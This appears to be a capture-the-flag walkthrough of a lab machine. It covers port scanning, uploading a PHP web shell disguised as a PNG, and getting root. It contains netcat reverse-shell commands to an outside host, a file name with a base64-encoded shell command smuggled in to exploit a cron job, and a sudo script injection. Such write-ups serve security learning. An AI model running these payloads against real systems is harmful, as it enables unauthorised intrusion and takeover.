
`sudo nmap -sC -sV -A -p- 10.10.10.146 -o nmap`
![[Pasted image 20250218150816.png]]

### Port 80
Wappalyzer
![[Pasted image 20250218151024.png]]

![[Pasted image 20250218151039.png]]
not alot there so we have a look a source 
![[Pasted image 20250218151231.png]]
try the page http://10.10.10.146/uploads/ which just gives a dot so i image more will appear here when things are uploaded 
![[Pasted image 20250218151318.png|400]]
run gobuster to see if we can find other directories 
`gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirb/common.txt -o gobuster -x txt,pdf,config,php`
![[Pasted image 20250218153305.png]]

visiting http://10.10.10.146/backup/
![[Pasted image 20250218151528.png]]
download the backup.tar file
extrat the tar and it gives us some php files
![[Pasted image 20250218151836.png]]

instresting information about the types we can upload in upload.php
![[Pasted image 20250218153804.png|600]]

first test normal behaior by uploading a png
![[Pasted image 20250218161106.png]]




![[Pasted image 20250218162056.png]]
(write all buffers save and exit with :wqa)
we used vim as it keeps the file type (the magic bytes) the same and just write it raw straight in the file
![[Pasted image 20250218162214.png]]

convert the file to WebGort.php.png and upload it
wehn we try and visit the file it is broken but if we put ?cmd=id at the end we get our command run
'http://10.10.10.146/uploads/10_10_14_9.php.png?cmd=id'
![[Pasted image 20250218162923.png|500]]

if we do a `which+nc` we can see nc is at `/usr/bin/nc`
now we can see where netcat is we can send a rev shell back to our machine for something a little more stable than the php web shell
`/usr/bin/nc%2010.10.14.9%204455%20-e%20%2Fbin%2Fsh`

![[Pasted image 20250218163246.png]]
we are on as the apache user 
enumerating inside of the box there is a user called guly
![[Pasted image 20250218163550.png]]

we can view in gulys home folder but cant read his user.txt file
![[Pasted image 20250218164138.png]]
if we read the crontab.guly we can see the php files runs every 3 miniutes
![[Pasted image 20250218164223.png]]
reading check_attack.php
``` php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
this code take take the files in path and then uses the names of them in an exec without filtering the names
so if we can name a file in the uploads folder as a command we can get it to run in the exec
used a simple nc rev shell from https://www.revshells.com/ base64 encoded it and then made the file with touch and named it 'a; echo bmMgMTAuMTAuMTQuOSA0NDY2IC1lIC9iaW4vc2g= | base64 -d | sh; b'
this bit of command injection will end the current exec command with a 
	then echo our nc command pip that in to base64 decode and then pip it in to sh
		finally then just putting the command for the letter b so then hopefuly it will get picked up and run the rest of the script if needed (dont mind if it doesnt our call back will have been made anyway)

`touch '/var/www/html/uploads/a; echo bmMgMTAuMTAuMTQuOSA0NDY2IC1lIC9iaW4vc2g= | base64 -d | sh; b'`
![[Pasted image 20250218165923.png]]
wait a minute and 
![[Pasted image 20250218170013.png]]
now we are guly and we can read the user flag

### Priv esc

run `sudo -l` to see if there is anything we can run
![[Pasted image 20250218170104.png]]
changename.sh with no password needed which is lucky as we dont have a password for guly 

reading the script it writes the file out to `/etc/sysconfig/network-scripts/ifcfg-guly`. It also fails to load the device `guly0` as it does not exist
![[Pasted image 20250218170130.png]]

as it is writing a file we can try again at injecting commands to see if it doing anything interesting with the inputs 

![[Pasted image 20250218170646.png]]
the id command is running and is root

so if we instead of id call a /bin/bash
![[Pasted image 20250218170758.png]]

we are then dropped in to a root shell
![[Pasted image 20250218170744.png]]

# Notes

when debugging the php code we can use `php -a` as an interactive shell to come the code in to and run it against test variables



























